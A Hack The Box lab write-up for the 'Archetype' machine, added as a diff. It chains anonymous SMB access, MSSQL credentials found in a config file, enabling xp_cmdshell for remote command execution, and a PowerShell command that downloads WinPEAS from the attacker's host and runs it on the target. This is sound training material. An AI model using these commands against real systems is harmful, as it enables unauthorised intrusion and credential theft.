@@ -1,0 +1,315 @@
+# Archetype — HTB Write-up
+
+*SMB Enumeration → MSSQL Access → xp_cmdshell RCE → Privilege Escalation*
+
+## Target Information
+
+| Target | OS | Difficulty |
+|--------|----|------------|
+| 10.129.48.83 | Windows | Very Easy |
+
+---
+
+# Enumeration
+
+*As always, we start with an Nmap scan to identify open ports and services.*
+
+```bash
+nmap -sS -sV 10.129.48.83
+```
+
+## Nmap Results
+
+```text
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
+```
+
+*Two services immediately stand out:*
+- *SMB (445/139)*
+- *MSSQL (1433)*
+
+*Instead of attacking MSSQL directly, I decided to first enumerate SMB shares in case credentials or configuration files were exposed.*
+
+---
+
+# SMB Enumeration
+
+*In beginner HTB labs, anonymous SMB access is sometimes enabled due to misconfigurations. Let's test that first.*
+
+```bash
+smbclient -L //10.129.48.83 -N
+```
+
+## Results
+
+```text
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+```
+
+*The `backups` share looks very interesting.*
+
+Let's access it:
+
+```bash
+smbclient //10.129.48.83/backups -N
+```
+
+List files:
+
+```bash
+ls
+```
+
+## Results
+
+```text
+prod.dtsConfig
+```
+
+*Configuration files often contain credentials, connection strings, or sensitive information.*
+
+Download the file:
+
+```bash
+mget prod.dtsConfig
+```
+
+---
+
+# Extracting Credentials
+
+Read the file:
+
+```bash
+cat prod.dtsConfig
+```
+
+## Results
+
+```xml
+<ConfiguredValue>
+Data Source=.;
+Password=M3g4c0rp123;
+User ID=ARCHETYPE\sql_svc;
+Initial Catalog=Catalog;
+</ConfiguredValue>
+```
+
+## Credentials Found
+
+```text
+ARCHETYPE\sql_svc : M3g4c0rp123
+```
+
+*We successfully recovered MSSQL credentials from the configuration file.*
+
+---
+
+# MSSQL Access
+
+Connect using Impacket's `mssqlclient.py`:
+
+```bash
+mssqlclient.py 'ARCHETYPE/sql_svc:M3g4c0rp123@10.129.48.83' -windows-auth
+```
+
+## Successful Login
+
+```text
+[*] ACK: Result: 1 - Microsoft SQL Server
+```
+
+---
+
+# Enabling xp_cmdshell
+
+*Initially, I made a typo while trying to execute commands.*
+
+```sql
+EXEC px_cmdshell 'whoami';
+```
+
+## Error
+
+```text
+Could not find stored procedure 'px_cmdshell'
+```
+
+*The correct procedure is `xp_cmdshell`.*
+
+By default, it is disabled.
+
+Enable advanced options:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+```
+
+Enable `xp_cmdshell`:
+
+```sql
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+Test command execution:
+
+```sql
+EXEC xp_cmdshell 'whoami';
+```
+
+## Results
+
+```text
+archetype\sql_svc
+```
+
+*We now have command execution on the target through MSSQL.*
+
+---
+
+# Downloading WinPEAS
+
+*To enumerate possible privilege escalation paths, I decided to use WinPEAS.*
+
+Download it on Kali:
+
+```bash
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
+```
+
+Rename it:
+
+```bash
+mv winPEASx64.exe wp.exe
+```
+
+*Short filenames make command execution easier later.*
+
+---
+
+# Hosting the File
+
+Check VPN IP:
+
+```bash
+ip a | grep tun0
+```
+
+Start a simple HTTP server:
+
+```bash
+python3 -m http.server 1337
+```
+
+## Results
+
+```text
+Serving HTTP on 0.0.0.0 port 1337
+```
+
+---
+
+# Transferring WinPEAS
+
+*The plan is to transfer `wp.exe` from Kali to the target machine using PowerShell and `xp_cmdshell`.*
+
+```sql
+EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://10.10.15.56:1337/wp.exe -OutFile C:\Windows\Temp\wp.exe"';
+```
+
+Verify the transfer:
+
+```sql
+EXEC xp_cmdshell 'dir C:\Windows\Temp';
+```
+
+---
+
+# Executing WinPEAS
+
+Run WinPEAS:
+
+```sql
+EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe';
+```
+
+Or save the output to a file:
+
+```sql
+EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe > C:\Windows\Temp\results.txt';
+```
+
+Read the output:
+
+```sql
+EXEC xp_cmdshell 'type C:\Windows\Temp\results.txt';
+```
+
+---
+
+# Searching for Credentials
+
+*The WinPEAS output was very large, so I manually searched for interesting files and possible credentials.*
+
+Search recursively for text files:
+
+```sql
+EXEC xp_cmdshell 'dir C:\Users\*.txt /s';
+```
+
+Read suspicious files:
+
+```sql
+EXEC xp_cmdshell 'type C:\path\to\file.txt';
+```
+
+*Eventually, administrator credentials were discovered inside a text file.*
+
+---
+
+# Privilege Escalation
+
+*Using the recovered administrator credentials, I was able to escalate privileges and gain full administrative access to the target.*
+
+---
+
+# Lessons Learned
+
+This lab helped me practice:
+
+- SMB enumeration
+- Anonymous SMB access
+- Extracting credentials from configuration files
+- MSSQL authentication
+- Enabling `xp_cmdshell`
+- Remote command execution through MSSQL
+- File transfer using PowerShell
+- Basic Windows privilege escalation enumeration with WinPEAS
+
+---
+
+# Tools Used
+
+- Nmap
+- SMBclient
+- Impacket
+- MSSQLClient.py
+- WinPEAS
+- PowerShell
+
+---
+
+# Final Thoughts
+
+*This machine was a very good introduction to Windows enumeration, MSSQL exploitation, and post-exploitation basics. It also helped me better understand how attackers chain small misconfigurations together to fully compromise a system.*
